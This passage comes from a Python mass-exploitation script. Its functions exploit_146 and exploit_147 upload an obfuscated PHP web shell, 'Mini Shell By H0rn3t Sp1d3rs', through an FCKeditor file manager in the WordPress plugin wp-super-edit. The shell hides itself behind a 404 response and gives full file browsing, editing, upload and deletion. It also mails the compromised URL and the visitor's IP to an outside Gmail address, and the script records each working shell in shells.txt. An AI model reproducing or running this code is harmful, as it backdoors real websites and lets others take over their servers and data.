	<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
	<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script>
	<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
	<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
</body>
</html>

------WebKitFormBoundaryeigShE8dZM8EnJxq--'''
        c = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/frmupload.html',headers=headers, data=data,allow_redirects=True,verify=False ,timeout=15)
        check = requests.get(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
        if ("mini shell by h0rn3t sp1d3rs" in check.content.decode("utf-8")):
                print (' [#] Exploit 146 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/h0rn3t.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            data= ''' ------WebKitFormBoundaryeigShE8dZM8EnJxq

Content-Disposition: form-data; name="NewFile"; filename="h0rn3t.php"

Content-Type: application/octet-stream



<?php
/*
exploit by h0rn3t sp1d3rs 
*/
error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By H0rn3t Sp1d3rs "); $G3 = "scandir"; $c8 = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65"); $lE = 0; T4: if (!($lE < count($c8))) { goto Je; } $c8[$lE] = JD($c8[$lE]); Cy: $lE++; goto T4; Je: if (isset($_GET["p"])) { goto sr; } $Jd = $c8[2](); goto VN; sr: $Jd = jD($_GET["p"]); $c8[3](Jd($_GET["p"])); VN: function Ss($SP) { $dE = ""; $lE = 0; NZ: if (!($lE < strlen($SP))) { goto Xc; } $dE .= dechex(ord($SP[$lE])); WK: $lE++; goto NZ; Xc: return $dE; } function Jd($SP) { $dE = ""; $gf = strlen($SP) - 1; $lE = 0; Xp: if (!($lE < $gf)) { goto ur; } $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1])); Wn: $lE += 2; goto Xp; ur: return $dE; } function rn($F1) { $Jd = fileperms($F1); if (($Jd & 0xc000) == 0xc000) { goto FZ; } if (($Jd & 0xa000) == 0xa000) { goto Eu; } if (($Jd & 0x8000) == 0x8000) { goto ES; } if (($Jd & 0x6000) == 0x6000) { goto sA; } if (($Jd & 0x4000) == 0x4000) { goto lG; } if (($Jd & 0x2000) == 0x2000) { goto tV; } if (($Jd & 0x1000) == 0x1000) { goto Tx; } $lE = 'u'; goto cC; FZ: $lE = 's'; goto cC; Eu: $lE = 'l'; goto cC; ES: $lE = '-'; goto cC; sA: $lE = 'b'; goto cC; lG: $lE = 'd'; goto cC; tV: $lE = 'c'; goto cC; Tx: $lE = 'p'; cC: $lE .= $Jd & 0x100 ? 'r' : '-'; $lE .= $Jd & 0x80 ? 'w' : '-'; $lE .= $Jd & 0x40 ? $Jd & 0x800 ? 's' : 'x' : ($Jd & 0x800 ? 'S' : '-'); $lE .= $Jd & 0x20 ? 'r' : '-'; $lE .= $Jd & 0x10 ? 'w' : '-'; $lE .= $Jd & 0x8 ? $Jd & 0x400 ? 's' : 'x' : ($Jd & 0x400 ? 'S' : '-'); $lE .= $Jd & 0x4 ? 'r' : '-'; $lE .= $Jd & 0x2 ? 'w' : '-'; $lE .= $Jd & 0x1 ? $Jd & 0x200 ? 't' : 'x' : ($Jd & 0x200 ? 'T' : '-'); return $lE; } function Xe($OB, $Ch = 1, $BL = "") { global $Jd; $xe = $Ch == 1 ? "success" : "error"; echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" . Ss($Jd) . $BL . "\"}})</script>"; } function tF($yf) { global $c8; if (!(trim(pathinfo($yf, PATHINFO_BASENAME), '.') === '')) { goto IE; } return; IE: if ($c8[6]($yf)) { goto PF; } unlink($yf); goto jK; PF: array_map("deldir", glob($yf . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT)); rmdir($yf); jK: } ?>
<!doctype html>
<!-- Mr.7Mind -->
<html lang="en">
<head>
	<meta name="theme-color" content="#00BFFF">
	<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
	<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<title>Shell Bypass By H0rn3t Sp1d3rs</title>
	<style>.table-hover tbody tr:hover td{background:#00BFFF}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style>
	<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript' /></script>
</head>
<body style="background-color:#000;color:#fff;font-family:serif;">
	<div class="bg-dark table-responsive text-light border">
		<div class="d-flex justify-content-between p-1">
			<div><h3 class="mt-2"><a href="?"><?= Yp; ?></a></h3></div>
		</div>
		<div class="border-top table-responsive">
			<li>PHP: <?= php_uname(); ?></li>
			<li>Doc Root: <?= "{$_SERVER["DOCUMENT_ROOT"]}"; ?></li>
			<li>Server: <?= "{$_SERVER["SERVER_ADDR"]}/{$_SERVER["REMOTE_ADDR"]}"; ?></li>
			<li>Domain : <?= "{$_SERVER["SERVER_NAME"]}"; ?></li>
			<li>Ip Server: <?= getHostByName(getHostName()); ?></li>
			<li>php Version: <?= phpversion(); ?></li>
			<li>Mysql: <?= (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
			<li>Curl: <?= (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
		</div>
		<form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
		<?php  if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
				<a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>"> [ Add New File ] </a>
				<a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>"> [ Add New Directory ] </a>
			</div>
	<div class="bg-dark border table-responsive mt-2">
		<div class="ml-2" style="font-size:18px;">
			<span>Path: </span>
			<?php  $Op = $c8[4]("/(\\\\|\\/)/", $Jd); foreach ($Op as $j3 => $Oe) { if (!($j3 == 0 && $Oe == "")) { goto xi; } echo "<a href=\"?p=2f\">~</a>/"; goto CS; xi: if (!($Oe == "")) { goto sq; } goto CS; sq: echo "<a href=\"?p="; $lE = 0; de: if (!($lE <= $j3)) { goto ie; } echo sS($Op[$lE]); if (!($lE != $j3)) { goto s0; } echo "2f"; s0: dg: $lE++; goto de; ie: echo "\">{$Oe}</a>/"; CS: } Go: ?>
		</div>
	</div>
	<article class="bg-dark border table-responsive mt-2">
		<?php  if (!isset($_GET["a"])) { goto Un; } if (!isset($_GET["a"])) { goto cc; } $im = Jd($_GET["a"]); cc: ?>
		<div class="px-2 py-2">
			<?php  if (!($im == "delete")) { goto Lu; } $BL = $Jd . '/' . Jd($_GET["n"]); if (!($_GET["t"] == "d")) { goto VZ; } TF($BL); if (!$c8[12]($BL)) { goto e8; } Xe("failed to delete the folder", 0); goto iL; e8: Xe("folder deleted successfully"); iL: VZ: if (!($_GET["t"] == "f")) { goto xB; } $BL = $Jd . '/' . jd($_GET["n"]); unlink($BL); if (!$c8[12]($BL)) { goto uH; } Xe("file to delete the folder", 0); goto Mk; uH: xe("file deleted successfully"); Mk: xB: Lu: ?>
			<?php  if ($im == "newDir") { goto Fg; } if ($im == "newFile") { goto Pb; } if ($im == "rename") { goto Lw; } if ($im == "edit") { goto Ox; } if ($im == "view") { goto Ag; } goto WC; Fg: ?>
			<h5 class="border p-1 mb-3">New folder</h5>
			<form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("folder name has been used", 0, "&a=" . SS("newDir")) : ($c8[15]("{$Jd}/{$_POST["n"]}") ? Xe("folder created successfully") : Xe("folder failed to create", 0)) : null; goto WC; Pb: ?>
			<h5 class="border p-1 mb-3">New file</h5>
			<form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Hacked By Mr.7Mind"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("file name has been used", 0, "&a=" . SS("newFile")) : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"]) ? XE("file created successfully", 1, "&a=" . ss("view") . "&n=" . Ss($_POST["n"])) : Xe("file failed to create", 0)) : null; goto WC; Lw: ?>
			<h5 class="border p-1 mb-3">Rename <?= $_GET["t"] == "d" ? "folder" : "file"; ?></h5>
			<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= jD($_GET["n"]); ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[16]($Jd . '/' . jD($_GET["n"]), $_POST["n"]) ? XE("successfully changed the folder name") : Xe("failed to change the folder name", 0) : null; goto WC; Ox: ?>
			<h5 class="border p-1 mb-3">Edit file</h5>
			<span>File name : <?= Jd($_GET["n"]); ?></span>
			<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $c8[18]($c8[14]($Jd . '/' . jD($_GET["n"]))); ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[13]($Jd . '/' . jD($_GET["n"]), $_POST["ctn"]) ? xE("file contents changed successfully", 1, "&a=" . sS("view") . "&n={$_GET["n"]}") : xE("file contents failed to change") : null; goto WC; Ag: ?>
			<h5 class="border p-1 mb-3">View file</h5>
			<span>File name : <?= jd($_GET["n"]); ?></span>
			<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea></div>
			<?php  WC: ?>
		</div>
		<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'ribelcyberteam@gmail.com, ribelcyberteam@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
		<?php  goto mR; Un: ?>
		<table class="table table-hover table-bordered table-sm">
			<thead class="text-light">
				<tr>
					<th>Name</th>
					<th>Size</th>
					<th>Permission</th>
					<th>Action</th>
				</tr>
			</thead>
			<tbody class="text-light">
				<?php  $G3 = $c8[5]($G3($Jd), [".", ".."]); foreach ($G3 as $yf) { if ($c8[6]("{$Jd}/{$yf}")) { goto CB; } goto Qj; CB: echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . sS("{$Jd}/{$yf}") . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) . "\"><i class=\"fa fa-fw fa-folder\"></i> {$yf}</a></td>\n\t\t\t\t\t\t<td>N/A</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$yf}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$yf}") ? "red" : null)) . "\">" . RN("{$Jd}/{$yf}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . ss("rename") . "&n=" . ss($yf) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t<a href=\"?p=" . sS($Jd) . "&a=" . ss("delete") . "&n=" . ss($yf) . "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>"; Qj: } ad: foreach ($G3 as $F1) { if ($c8[7]("{$Jd}/{$F1}")) { goto wA; } goto X1; wA: $kL = $c8[10]("{$Jd}/{$F1}") / 1024; $kL = round($kL, 3); $kL = $kL > 1024 ? round($kL / 1024, 2) . "MB" : $kL . "KB"; echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . SS($Jd) . "&a=" . sS("view") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) . "\"><i class=\"fa fa-fw fa-file\"></i> {$F1}</a></td>\n\t\t\t\t\t\t<td>{$kL}</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$F1}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$F1}") ? "red" : null)) . "\">" . rN("{$Jd}/{$F1}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<div class=\"d-flex justify-content-between\">\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . Ss($Jd) . "&a=" . Ss("edit") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . SS("rename") . "&n=" . ss($F1) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&n=" . sS($F1) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . sS("delete") . "&n=" . ss($F1) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>\n\t\t\t\t\t"; X1: } a2: ?>
			</tbody>
		</table>
		<?php  mR: ?>
	</article>
	<div class="bg-dark border text-center mt-2">
		<small></small>
	</div>
	<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
	<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script>
	<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
	<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
</body>
</html>

------WebKitFormBoundaryeigShE8dZM8EnJxq--'''
            c = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/frmupload.html',headers=headers, data=data,allow_redirects=True,verify=False ,timeout=15)
            check = requests.get(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "mini shell by h0rn3t sp1d3rs" in check.content.decode("utf-8"):
                    print (' [#] Exploit 146 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/h0rn3t.php\n')
            else:
                print ('[#] Exploit 146 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_147(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        data="""------WebKitFormBoundaryvBB76aRVDW1qvJ4K

Content-Disposition: form-data; name="NewFile"; filename="x.php"

Content-Type: application/octet-stream



<?php
/*
exploit by h0rn3t sp1d3rs 
*/
error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By H0rn3t Sp1d3rs "); $G3 = "scandir"; $c8 = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65"); $lE = 0; T4: if (!($lE < count($c8))) { goto Je; } $c8[$lE] = JD($c8[$lE]); Cy: $lE++; goto T4; Je: if (isset($_GET["p"])) { goto sr; } $Jd = $c8[2](); goto VN; sr: $Jd = jD($_GET["p"]); $c8[3](Jd($_GET["p"])); VN: function Ss($SP) { $dE = ""; $lE = 0; NZ: if (!($lE < strlen($SP))) { goto Xc; } $dE .= dechex(ord($SP[$lE])); WK: $lE++; goto NZ; Xc: return $dE; } function Jd($SP) { $dE = ""; $gf = strlen($SP) - 1; $lE = 0; Xp: if (!($lE < $gf)) { goto ur; } $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1])); Wn: $lE += 2; goto Xp; ur: return $dE; } function rn($F1) { $Jd = fileperms($F1); if (($Jd & 0xc000) == 0xc000) { goto FZ; } if (($Jd & 0xa000) == 0xa000) { goto Eu; } if (($Jd & 0x8000) == 0x8000) { goto ES; } if (($Jd & 0x6000) == 0x6000) { goto sA; } if (($Jd & 0x4000) == 0x4000) { goto lG; } if (($Jd & 0x2000) == 0x2000) { goto tV; } if (($Jd & 0x1000) == 0x1000) { goto Tx; } $lE = 'u'; goto cC; FZ: $lE = 's'; goto cC; Eu: $lE = 'l'; goto cC; ES: $lE = '-'; goto cC; sA: $lE = 'b'; goto cC; lG: $lE = 'd'; goto cC; tV: $lE = 'c'; goto cC; Tx: $lE = 'p'; cC: $lE .= $Jd & 0x100 ? 'r' : '-'; $lE .= $Jd & 0x80 ? 'w' : '-'; $lE .= $Jd & 0x40 ? $Jd & 0x800 ? 's' : 'x' : ($Jd & 0x800 ? 'S' : '-'); $lE .= $Jd & 0x20 ? 'r' : '-'; $lE .= $Jd & 0x10 ? 'w' : '-'; $lE .= $Jd & 0x8 ? $Jd & 0x400 ? 's' : 'x' : ($Jd & 0x400 ? 'S' : '-'); $lE .= $Jd & 0x4 ? 'r' : '-'; $lE .= $Jd & 0x2 ? 'w' : '-'; $lE .= $Jd & 0x1 ? $Jd & 0x200 ? 't' : 'x' : ($Jd & 0x200 ? 'T' : '-'); return $lE; } function Xe($OB, $Ch = 1, $BL = "") { global $Jd; $xe = $Ch == 1 ? "success" : "error"; echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" . Ss($Jd) . $BL . "\"}})</script>"; } function tF($yf) { global $c8; if (!(trim(pathinfo($yf, PATHINFO_BASENAME), '.') === '')) { goto IE; } return; IE: if ($c8[6]($yf)) { goto PF; } unlink($yf); goto jK; PF: array_map("deldir", glob($yf . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT)); rmdir($yf); jK: } ?>
<!doctype html>
<!-- Mr.7Mind -->
<html lang="en">
<head>
	<meta name="theme-color" content="#00BFFF">
	<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
	<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<title>Shell Bypass By H0rn3t Sp1d3rs</title>
	<style>.table-hover tbody tr:hover td{background:#00BFFF}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style>
	<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript' /></script>
</head>
<body style="background-color:#000;color:#fff;font-family:serif;">
	<div class="bg-dark table-responsive text-light border">
		<div class="d-flex justify-content-between p-1">
			<div><h3 class="mt-2"><a href="?"><?= Yp; ?></a></h3></div>
		</div>
		<div class="border-top table-responsive">
			<li>PHP: <?= php_uname(); ?></li>
			<li>Doc Root: <?= "{$_SERVER["DOCUMENT_ROOT"]}"; ?></li>
			<li>Server: <?= "{$_SERVER["SERVER_ADDR"]}/{$_SERVER["REMOTE_ADDR"]}"; ?></li>
			<li>Domain : <?= "{$_SERVER["SERVER_NAME"]}"; ?></li>
			<li>Ip Server: <?= getHostByName(getHostName()); ?></li>
			<li>php Version: <?= phpversion(); ?></li>
			<li>Mysql: <?= (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
			<li>Curl: <?= (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
		</div>
		<form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
		<?php  if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
				<a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>"> [ Add New File ] </a>
				<a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>"> [ Add New Directory ] </a>
			</div>
	<div class="bg-dark border table-responsive mt-2">
		<div class="ml-2" style="font-size:18px;">
			<span>Path: </span>
			<?php  $Op = $c8[4]("/(\\\\|\\/)/", $Jd); foreach ($Op as $j3 => $Oe) { if (!($j3 == 0 && $Oe == "")) { goto xi; } echo "<a href=\"?p=2f\">~</a>/"; goto CS; xi: if (!($Oe == "")) { goto sq; } goto CS; sq: echo "<a href=\"?p="; $lE = 0; de: if (!($lE <= $j3)) { goto ie; } echo sS($Op[$lE]); if (!($lE != $j3)) { goto s0; } echo "2f"; s0: dg: $lE++; goto de; ie: echo "\">{$Oe}</a>/"; CS: } Go: ?>
		</div>
	</div>
	<article class="bg-dark border table-responsive mt-2">
		<?php  if (!isset($_GET["a"])) { goto Un; } if (!isset($_GET["a"])) { goto cc; } $im = Jd($_GET["a"]); cc: ?>
		<div class="px-2 py-2">
			<?php  if (!($im == "delete")) { goto Lu; } $BL = $Jd . '/' . Jd($_GET["n"]); if (!($_GET["t"] == "d")) { goto VZ; } TF($BL); if (!$c8[12]($BL)) { goto e8; } Xe("failed to delete the folder", 0); goto iL; e8: Xe("folder deleted successfully"); iL: VZ: if (!($_GET["t"] == "f")) { goto xB; } $BL = $Jd . '/' . jd($_GET["n"]); unlink($BL); if (!$c8[12]($BL)) { goto uH; } Xe("file to delete the folder", 0); goto Mk; uH: xe("file deleted successfully"); Mk: xB: Lu: ?>
			<?php  if ($im == "newDir") { goto Fg; } if ($im == "newFile") { goto Pb; } if ($im == "rename") { goto Lw; } if ($im == "edit") { goto Ox; } if ($im == "view") { goto Ag; } goto WC; Fg: ?>
			<h5 class="border p-1 mb-3">New folder</h5>
			<form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("folder name has been used", 0, "&a=" . SS("newDir")) : ($c8[15]("{$Jd}/{$_POST["n"]}") ? Xe("folder created successfully") : Xe("folder failed to create", 0)) : null; goto WC; Pb: ?>
			<h5 class="border p-1 mb-3">New file</h5>
			<form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Hacked By Mr.7Mind"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("file name has been used", 0, "&a=" . SS("newFile")) : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"]) ? XE("file created successfully", 1, "&a=" . ss("view") . "&n=" . Ss($_POST["n"])) : Xe("file failed to create", 0)) : null; goto WC; Lw: ?>
			<h5 class="border p-1 mb-3">Rename <?= $_GET["t"] == "d" ? "folder" : "file"; ?></h5>
			<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= jD($_GET["n"]); ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
